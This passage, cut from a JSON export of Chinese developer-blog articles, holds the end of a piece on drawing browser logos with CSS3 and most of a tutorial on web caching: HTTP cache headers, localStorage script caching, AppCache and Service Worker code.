-50%);\n    border-radius:50%;\n    border:5px solid #E8E8E8;\n    box-shadow:\n            -1px 3px 1px 2px #999,\n            -1px 3px 1px 2px #999 inset;\n    background-image:\n            radial-gradient(transparent 30%,#fff 30%,#fff 34%, transparent 34%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(#1DE3FF 0%, #1F52EF 100%);\n    background-size: 50% 50%,20px 2px,20px 2px,2px 20px,2px 20px,100%,100%;\n    background-repeat:no-repeat;\n    background-position:center center, 175px center,5px center,center 175px,center 5px,0 0;\n\n}\n.safari::before{\n    content:\"\";\n    position: absolute;\n    top: 10px;left: 50%;\n    border-radius:10px;\n    border-bottom:100px solid rgba(255,255,255,.9);\n    border-left:10px solid transparent;\n    border-right:10px solid transparent;\n    transform-origin:center 90px;\n    z-index:-1;\n    transform:translate(-50%, 0%) rotate(40deg);\n}\n.safari::after{\n    content:\"\";\n    position: absolute;\n    top: 10px;left: 50%;\n    border-radius:10px;\n    border-bottom:100px solid rgba(255,0,0,.9);\n    border-left:10px solid transparent;\n    border-right:10px solid transparent;\n    transform-origin:center 90px;\n    transform:translate(-50%, 0%) rotate(220deg);\n}\n.safari:hover::before{\n    transition:transform 1s;\n    transform:translate(-50%, 0%) rotate(70deg);\n}\n.safari:hover::after{\n    transition:transform 1s;\n    transform:translate(-50%, 0%) rotate(250deg);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003efirefox\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"firefox\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c9c9d255ca6a?w=303\u0026amp;h=262\u0026amp;f=png\u0026amp;s=15080\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用多重阴影实现 , 代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*firefox*/\n.firefox{\n    position: absolute;\n    top: 50%;left: 50%;\n    width: 200px;height:200px;\n    transform: translate(-50%, -50%);\n    border:8px solid #eee;\n    border-radius:50%;\n    overflow:hidden;\n    background:#F48D00;\n    box-shadow:0 0 2px 0 #999;\n}\n.firefox::before{\n    content: \"\";\n    width: 46px;\n    height: 46px;\n    background: #A4DFEF;\n    border-radius: 100%;\n    position: absolute;\n    top: 90px;\n    left: 50px;\n    margin: auto;\n    border: 1px solid #A4DFEF;\n    box-shadow:\n            -10px 0 0 5px rgba(164, 223, 239, .2),\n            16px -60px 0 8px rgba(164, 223, 239, .2),\n            -30px -50px 0 8px #F48D00,\n            25px -38px 0 0px #A4DFEF,\n            -30px -30px 0 12px #F48D00,\n            15px -60px 0 8px #A4DFEF,\n            33px 31px 0 -15px #A4DFEF,\n            30px 17px 0 -13px #F48D00,\n            20px -10px 0 0px #A4DFEF,\n            -8px -0px 0 19px #F48D00,\n            30px 17px 0 0px #A4DFEF,\n            24px 30px 0 15px #F48D00,\n            20px -6px 0 28px #A4DFEF,\n            45px 10px 0 35px #F48D00,\n            -5px -57px 0 8px #F48D00,\n            20px -23px 0 45px #A4DFEF,\n            -5px -80px 0 8px #A4DFEF,\n            -30px -70px 0 8px #F48D00,\n            -5px -57px 0 8px #F48D00,\n            43px -11px 0 55px #F48D00,\n            22px -39px 0 55px #A4DFEF;\n}\n.firefox::after{\n    content: \"\";\n    width: 0px;\n    height: 2px;\n    background: linear-gradient(90deg,#F48D00 75% ,#333 30% );\n    background-size: 35px 35px;\n    position: absolute;\n    top: 50px;\n    left: 73px;\n    margin: auto;\n    border: solid;\n    border-width: 12px 0 15px 30px;\n    border-color: #A4DFEF #fff #A4DFEF transparent;\n    box-shadow: inset 0px 0 0 50px #333;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e搜狗\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"搜狗\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c9d800b66778?w=304\u0026amp;h=267\u0026amp;f=png\u0026amp;s=17833\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用文字、阴影实现 , 具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*sougou*/\n.sogou{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;height:200px;\n    transform: translate(-50%, -50%);\n    border:8px solid #fff;\n    box-shadow: 2px 1px 2px 2px #ccc;\n    border-radius:50%;\n    overflow:hidden;\n    background:#4DA0ED;\n}\n.sogou::before{\n    content:\"S\";\n    position: absolute;\n    line-height: 185px;\n    top:0;\n    left:0;\n    right:0;\n    bottom:0;\n    color:#fff;\n    font-weight:600;\n    font-size:320px;\n    text-align:center;\n    text-shadow:\n            3px 0 0px #337FC4,\n            -5px 0px 0px #CDE4F0,\n            0px 8px 0px #387FBF;\n    transform:rotate(2deg);\n    z-index:-10;\n    overflow:hidden;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e利用滤镜实现混合效果\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"filter-mix\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609caaf1fcb43b8?w=433\u0026amp;h=233\u0026amp;f=gif\u0026amp;s=275994\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 \u003ccode\u003efliter:blur()\u003c/code\u003e 、\u003ccode\u003efilter:contrast()\u003c/code\u003e 实现 ， 代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*filter-mix*/\n.filter-mix{\n    position: absolute;\n    top: 50%;left: 50%;\n    transform: translate(-50%, -50%);\n    width: 300px;height: 200px;\n    -webkit-filter:contrast(20);\n    background:#fff;\n}\n.filter-mix::before{\n    content:\"\";\n    position: absolute;\n    width:120px;\n    height:120px;\n    border-radius: 50%;\n    background:#333;\n    top:40px;\n    left:0px;\n    z-index:2;\n    -webkit-filter:blur(6px);\n    box-sizing:border-box;\n    animation:filterBallMove 10s ease-out infinite;\n    -webkit-animation:filterBallMove 10s ease-out infinite;\n}\n.filter-mix::after{\n    content:\"\";\n    position: absolute;\n    width:80px;\n    height:80px;\n    border-radius: 50%;\n    background:#3F51B5;\n    top:60px;\n    right:0px;\n    z-index:2;\n    -webkit-filter:blur(6px);\n    animation:filterBallMove2 10s ease-out infinite;\n    -webkit-animation:filterBallMove2 10s ease-out infinite;\n\n}\n\n@keyframes filterBallMove{\n    50%{\n        left:200px;\n    }\n}\n\n@-webkit-keyframes filterBallMove{\n    50%{\n        left:200px;\n    }\n}\n\n@keyframes filterBallMove2{\n    50%{\n        right:200px;\n    }\n}\n\n@-webkit-keyframes filterBallMove2{\n    50%{\n        right:200px;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e装逼总结\u003c/h3\u003e\n\u003cp\u003e怎么样，是不是颠覆了你对 \u003ccode\u003eCSS3\u003c/code\u003e 的认识？\u003c/p\u003e\n\u003cp\u003e实际上 \u003ccode\u003eCSS3\u003c/code\u003e 带给我们的远不止这些东西，没有做不到，只有想不到，只有你脑洞够大，各种黑科技、酷炫的 \u003ccode\u003eCSS\u003c/code\u003e 必然也是手到擒来~\u003c/p\u003e\n\u003cp\u003e虽然你给不了 \u003ccode\u003eCSS3\u003c/code\u003e 全部，但它却把全部给了你，骚年，加油吧~\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"end\" src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a05b024f6d86e?w=220\u0026amp;h=220\u0026amp;f=png\u0026amp;s=39877\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e参考文献\u003c/h3\u003e\n\u003cp\u003e本文主要来源以下文章：\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/chokcoco/magicCss\"\u003emagicCss\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/cssmagic/CSS-Secrets\"\u003eCSS Secrets\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e对 \u003ccode\u003eCSS\u003c/code\u003e 感兴趣的同学可以去作者的 \u003ca target=\"_blank\" href=\"https://github.com/chokcoco\"\u003egithub\u003c/a\u003e 点个赞~\u003c/p\u003e\n","buildTime":"1514894750.6163","__v":0}
{"_id":{"$oid":"5a4b76a1b11e1a170cb138e9"},"id":"5a482d976fb9a044fc451456","author":{"$oid":"5a4b76a1b11e1a170cb138cf"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/31/160a9f211884748b?w=728\u0026h=763\u0026f=jpeg\u0026s=77564"],"screenShot":null}],"title":"前端性能优化之缓存技术","meta":{"likeCount":0},"tag":["JavaScript","HTTP"],"comment":[],"shortContent":"缓存一直以来都是用来提高性能的一项必不可少的技术 ， 利用这项技术可以很好地提高web的性能。 缓存可以很有效地降低网络的时延，同时也会减少大量请求对于服务器的压力。 接下来这篇文章将会详细地介绍在web领域中缓存的一些知识点和应用。 由于整个网络服务都是基于http协议 的，…","content":"\u003cp\u003e缓存一直以来都是用来提高性能的一项必不可少的技术 ， 利用这项技术可以很好地提高web的性能。 缓存可以很有效地降低网络的时延，同时也会减少大量请求对于服务器的压力。 接下来这篇文章将会详细地介绍在web领域中缓存的一些知识点和应用。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e从HTTP协议开始说起\u003c/h1\u003e\n\u003cp\u003e由于整个网络服务都是基于http协议 的，因此先来介绍一下HTTP协议当中定义的缓存机制。HTTP协议主要是通过请求头当中的一些字段来和服务器进行通信，从而采用不同的缓存策略。\u003c/p\u003e\n\u003cp\u003e一般来说，对于一个完整的HTTP GET请求缓存过程会包含七个主要的步骤：①从接收网络请求开始，②客户端会读取请求报文并且对报文进行解析, 进而提取URL和各种首部，③然后将会查询是否在本地有副本，如果本地没有副本就会从服务器上获取一份副本并且保存在本地。④接着会进行查看副本是否足够新鲜（新鲜度检测）， 如果缓存已经失效就会询问服务器是否有任何更新，⑤服务器就会用新的首部和已缓存的主体来构建一条响应报文，⑥最后发送给客户端。⑦根据服务器的不同，会可选地选择创建日志记录该过程。\u003c/p\u003e\n\u003cp\u003e具体的流程可以看下面这张图(该图来自HTTP权威指南)：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"http请求缓存流程图\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160a9f21130bee6b?w=903\u0026amp;h=569\u0026amp;f=jpeg\u0026amp;s=80811\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e根据缓存处理方式的不同，接着又会分为两类：强缓存和协商缓存。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e强缓存\u003c/h2\u003e\n\u003cp\u003e强缓存主要是采用响应头中的Cache-Control和Expires两个字段进行控制的。其中Expires是HTTP 1.0中定义的，它指定了一个绝对的过期时期。而Cache-Control是HTTP 1.1时出现的缓存控制字段。Cache-Control:max-age定义了一个最大使用期，就是从第一次生成文档到缓存不再生效的合法生存日期。由于Expires是HTTP1.0时代的产物，因此设计之初就存在着一些缺陷，如果本地时间和服务器时间相差太大，就会导致缓存错乱。这两个字段同时使用的时候Cache-Control的优先级给更高一点。\n这两个字段的效果是类似的，客户端都会通过对比本地时间和服务器生存时间来检测缓存是否可用。如果缓存没有超出它的生存时间内，客户端就会直接采用本地的缓存。如果生存日期已经过了，这个缓存也就宣告失效。接着客户端将再次与服务器进行通信来验证这个缓存是否需要更新。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e协商缓存\u003c/h2\u003e\n\u003cp\u003e强缓存机制如果检测到缓存失效，就需要进行服务器再验证。这种缓存机制也称作协商缓存。浏览器在第一次获取请求的时候，就会在响应头中携带上资源的上次服务器修改日期(Last-Modified)或者资源的标签（Etag)。后续的请求服务器会根据请求头上的If-Modified-Since（对应Last-Modified）和（If-None-Match)字段来判断资源是否失效，一旦资源过期，则服务器会重新发送新的资源到客户端上，从而保证资源的有效性。\u003c/p\u003e\n\u003cp\u003e其中Last-Modified字段对应的是资源最后修改时间，例如：`Last-Modified:\u003c/p\u003e\n\u003cp\u003eSat, 30 Dec 2017 20:18:56 GMT` ，当客户端再次请求该资源的时候，会在其请求头上附带上If-Modified-Since字段，值就是之前返回的Last-Modified值。如果资源未过期，命中缓存，服务器就直接返回304状态码，客户端直接使用本地的资源。否则，服务器重新发送响应资源。\u003c/p\u003e\n\u003cp\u003e另外一种协商缓存的校验方式的通过校验码而不是时间，这样就保证了在文件内容不变的情况下不会重复占用网络资源。响应头中Etag字段是服务器给资源打上的一个标记，利用这个标记就可以实现缓存的更新。后续发起的请求，会在请求头上附带上If-None-Match字段，其值就是这个标记的值。\u003c/p\u003e\n\u003cp\u003e需要注意的是当响应头中同时存在Etag和Last-Modified的时候，会先对Etag进行比对，随后才是Last-Modified。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e浏览器缓存\u003c/h1\u003e\n\u003cp\u003e上面介绍了网络协议层面的缓存方案，接下来从前端的角度来看一下浏览器中几种常用的缓存技术。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003elocalstorage\u003c/h2\u003e\n\u003cp\u003e本来HTTP协议的缓存方案很美好了，不过当用户主动触发页面刷新内容，如：F5等，就会使浏览器的强缓存失效，进而转变成协商缓存。而利用LocalStorage可以无视用户主动刷新行为，并且可以存储较大体积的资源（2M以上)。\u003c/p\u003e\n\u003cp\u003elocalStorage的使用也较为简单：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e key = \u003cspan class=\"hljs-string\"\u003e'scq000'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e value = \u003cspan class=\"hljs-string\"\u003e'hello world'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-comment\"\u003e// 存\u003c/span\u003e\nlocalStorage.setItem(key, value);\n\n\u003cspan class=\"hljs-comment\"\u003e// 取\u003c/span\u003e\nlocalStorage.getItem(key);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e虽说localStorage一般是用来存储应用数据的，但是也可以利用其存储js和css等静态资源。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"testJs\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"example.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 以js为例\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e lsKey = \u003cspan class=\"hljs-string\"\u003e'loadJSv1.0'\u003c/span\u003e; \u003cspan class=\"hljs-comment\"\u003e// 作为localStorage存取的key;\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e// 获取要缓存或者执行的源码内容\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003egetScriptContent\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eurl, callback\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e httpRequest = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e XMLHttpRequest();\n\u0009httpRequest.onreadystatechange = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (httpRequest.readyState === \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) {\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (httpRequest.status === \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) {\n            \u0009\u003cspan class=\"hljs-comment\"\u003e// 获取代码内容\u003c/span\u003e\n                \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e codeStr = httpRequest.responseText;\n          \u0009    callback \u0026amp;\u0026amp; callback(codeStr);\n            }\n        }\n    };\n\u0009httpRequest.open(\u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e, url);\n\u0009httpRequest.send();\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// 第一次运行的时候缓存\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ecacheJs\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eurl\u003c/span\u003e) \u003c/span\u003e{\n  \u0009\u003cspan class=\"hljs-comment\"\u003e// 获取代码内容 \u003c/span\u003e\n  \u0009getScriptContent(url, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecodeStr\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(codeStr);\n        \u003cspan class=\"hljs-comment\"\u003e// 执行代码并缓存\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e script = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.createElement(\u003cspan class=\"hljs-string\"\u003e'script'\u003c/span\u003e);\n\u0009\u0009script.innerHTML = codeStr;\n  \u0009\u0009localStorage.setItem(lsKey, codeStr);\n    });\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// 加载源码\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eloadJs\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eurl\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 读取缓存\u003c/span\u003e\n \u0009\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cacheStr = localStorage.getItem(lsKey);\n  \u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(cacheStr) {\n      \u0009\u003cspan class=\"hljs-comment\"\u003e// 插入浏览器中，或者也可以直接使用eval执行\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e script = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.createElement(\u003cspan class=\"hljs-string\"\u003e'script'\u003c/span\u003e);\n\u0009\u0009script.innerHTML = cacheStr;\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"使用缓存成功\"\u003c/span\u003e);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-comment\"\u003e// 没有缓存，就会从服务器获取源码并缓存到本地\u003c/span\u003e\n        cacheJs(url);\n    }\n}\n\n\u003cspan class=\"hljs-comment\"\u003e// 第一次执行的时候，会直接执行并缓存到localhost中去，第二次进入的时候，会直接使用缓存\u003c/span\u003e\nloadJs(\u003cspan class=\"hljs-string\"\u003e'http://code.jquery.com/jquery-3.2.1.min.js'\u003c/span\u003e)\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面只是一个简单的demo，如果真的要使用这种方案，还需要考虑到更新处理问题。\u0008\u003c/p\u003e\n\u003cp\u003e作为一种性能优化的方案，这种方法也曾被大量应用于移动端的网页中。不过缺点也很明显，由于localStorage是保存在本地中的，所以很容易导致xss注入攻击。如果要使用这种方案，一定要做好对应的安全措施。在这里推荐一篇文章：\u003ca target=\"_blank\" href=\"https://imququ.com/post/enhance-security-for-ls-code.html\"\u003e使用 SRI 增强 localStorage 代码安全\u003c/a\u003e。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eApp Cache方案\u003c/h2\u003e\n\u003cp\u003eHTML5曾经提供了一个应用程序缓存机制, 使得基于web的应用程序可以离线运行。这就是App Cache(采用mainfest文件进行缓存）, 由于方案目前正在从web标准中删除，所以在这里只做简单的介绍。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e新建一个html文件的时候，添加mainfest属性，并且指定缓存清单文件，这个文件是在应用处于离线状态时使用的。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html manifest=\u003cspan class=\"hljs-string\"\u003e\"index.appcache\"\u003c/span\u003e\u0026gt;\n\u0026lt;head\u0026gt;\n\u0009\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e新建缓存清单文件index.appcache\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eCACHE MANIFEST\n\u003cspan class=\"hljs-comment\"\u003e# v1 - 2017-11-11 \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 缓存版本号\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 指定需要被缓存的文件\u003c/span\u003e\nCACHE:\nindex.html\nscript.js\n\n\u003cspan class=\"hljs-comment\"\u003e# 指定需要和服务器连接的白名单,将不进行缓存\u003c/span\u003e\nNETWORK:\nstyle.css\n\n\u003cspan class=\"hljs-comment\"\u003e# 回退页面，当资源无法访问，浏览器将采用该页面\u003c/span\u003e\nFALLBACK:\nindex_bak.html\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个方案一个比较不好的地方，是需要和服务器进行配合，mainfest文件的版本更新也是一个问题，同时资源还不支持部分更新。如果你想了解更多，可以访问\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Using_the_application_cache\"\u003eUsing the application cache\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eService Worker\u003c/h2\u003e\n\u003cp\u003e作为AppCache的替代方案，Service Worker 是一个相对来说比较新的技术，其目的也主要是为了提高web app的用户体验，可以实现离线应用消息推送等等一系列的功能， 从而进一步缩小与原生应用的差距。\nService Worker可以看做是一个独立于浏览器的Javascript代理脚本,通过JS的控制，能够使应用先获取本地缓存资源（Offline First)，从而在离线状态下也能提供基本的功能。\n出于安全性的考虑，Service Worker 只能在https协议下使用，不过为了便于开发，现在的浏览器默认支持localhost使用Service Worker。\u003c/p\u003e\n\u003cp\u003eService Worker整个的使用过程包括了注册，安装，激活，睡眠销毁等等一系列的状态。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e注册\u003c/h3\u003e\n\u003cp\u003e首先需要在页面中注册一个Service Worker。需要写在入口文件中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eif(‘serviceWorker' in navigator) {\n  navigator.serviceWorker.register('./testSW.js', {scope: '/src'}).then(reg =\u0026gt; {\n\u0009console.log('service worker is working', reg);    \n  }).catch(e =\u0026gt; console.log('register service worker failed'));\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于兼容性的问题，需要在代码开始做浏览器特性检测处理。注册时候，scope参数是可选的，用来限制SW的工作范围的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e安装和激活\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 用来标记缓存\nconst CACHE_FILE = \u003cspan class=\"hljs-string\"\u003e'my-sw-demo-v1'\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e filesToCache = [\n  \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'/index.html'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'/scripts/main.js'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'/styles/main.css'\u003c/span\u003e\n];\n\n// 安装\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'install'\u003c/span\u003e, event =\u0026gt; {\n  event.waitUntil(\n  \u0009caches.open(CACHE_FILE)\n  \u0009\u0009.then(cache =\u0026gt; cache.addAll(filesToCache));\n  );\n});\n\n// 添加fetch事件监听\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'fetch'\u003c/span\u003e, event =\u0026gt; {\n  event.responseWith(\n  \u0009caches.match(event.request)\n  \u0009\u0009.then(response =\u0026gt; response)\n  \u0009\u0009.catch(() =\u0026gt; fetch(event.request));\n  );\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e当用户首次访问页面的时候，会触发SW的安装事件，addAll方法接收需要被缓存文件的url列表，并会自动获取这些文件存入缓存中。\n接下来注册的fetch事件监听器会在每次SW被控制的资源请求时触发，拦截请求并在缓存中匹配对应资源。如果缓存命中，则直接返回资源，否则去发起fetch请求。\n当然，如果你想更进一步，可以在缓存没有命中的时候，获取资源然后将获取到资源加入缓存中。另外，在网络不可用的时候，提供一种回退方案。上面的代码可以改写成这样：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 添加fetch事件监听\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'fetch'\u003c/span\u003e, event =\u0026gt; {\n  event.respondWith(\n    caches.match(event.request).catch(() =\u0026gt; {\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e fetch(event.request).then(response =\u0026gt; {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e caches.open(\u003cspan class=\"hljs-string\"\u003e'v1'\u003c/span\u003e).then(cache =\u0026gt; {\n          cache.put(event.request, response.clone());\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e response;\n        });\n      });\n    }).catch(() =\u0026gt; {\n      // 回退资源\n      \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e caches.match(\u003cspan class=\"hljs-string\"\u003e'/fallback.html'\u003c/span\u003e);\n    })\n  );\n});\n\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e更新资源\u003c/h3\u003e\n\u003cp\u003e如果应用中SW已经安装，但是刷新的时候检测到有新版保持可用，就会自动安装。但是需要注意的是，只有当不再有任何已加载页面在使用旧版SW的时候，新版本的SW才会被激活。\u003c/p\u003e\n\u003cp\u003e咱们把上面的版本号更改一下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e CACHE_FILE = \u003cspan class=\"hljs-string\"\u003e'my-sw-demo-v2'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时刷新页面，当\u003ccode\u003einstall\u003c/code\u003e事件发生的时候，前一个版本（my-sw-demo-v1)如果还在被其它页面使用，则这个新版本不会被激活，当所有页面都不再使用v1的时候，v2就会激活并开始响应请求。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e删除旧缓存\u003c/h3\u003e\n\u003cp\u003e作为缓存的完整生命周期来说，提供删除功能必不可少。我们有时候需要手动删除旧版本的缓存，以便释放有限的浏览器缓存空间。此时，可以利用\u003ccode\u003eactivate\u003c/code\u003e事件和\u003ccode\u003ewaitUntil\u003c/code\u003e这样一个方法来清理缓存。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 清理缓存操作\u003c/span\u003e\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'activate'\u003c/span\u003e, event =\u0026gt; {\n  \u003cspan class=\"hljs-comment\"\u003e// 设置白名单，不需要删除的缓存key\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e cacheWhiteList = [\u003cspan class=\"hljs-string\"\u003e'v2'\u003c/span\u003e];\n  \n  event.waitUntil(\n  